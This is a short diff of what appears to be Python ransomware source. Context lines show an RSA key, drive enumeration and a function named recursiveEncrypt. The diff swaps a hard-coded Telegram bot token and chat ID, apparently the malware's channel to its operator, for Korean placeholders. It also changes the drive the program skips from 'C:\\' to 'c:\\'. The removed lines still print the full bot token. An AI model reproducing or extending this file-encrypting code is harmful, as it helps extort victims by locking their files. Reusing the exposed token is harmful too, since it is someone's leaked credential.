@@ -25,8 +25,8 @@ PUBLIC_SERVER_RSA_KEY=PublicKey(b'A?\xb6\xdcJ\x02e1-\xbfN9BWkY\x13B+\x02\x03\xfa
 
 AES_BOX=0
 
-BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')
-CHAT_ID=5911780078
+BOT=telegram.Bot(token='개인토큰')
+CHAT_ID='개인아이디'
 
 EncryptModule=0
 
@@ -107,7 +107,7 @@ def listUpTargetDir():
         drive=f"{chr(letter)}:\\"
         if (pathlib.Path(drive).exists()):
             PathList.append(drive)
-    PathList.remove("C:\\")
+    PathList.remove("c:\\")
 
 def recursiveEncrypt(basepath):
     try:
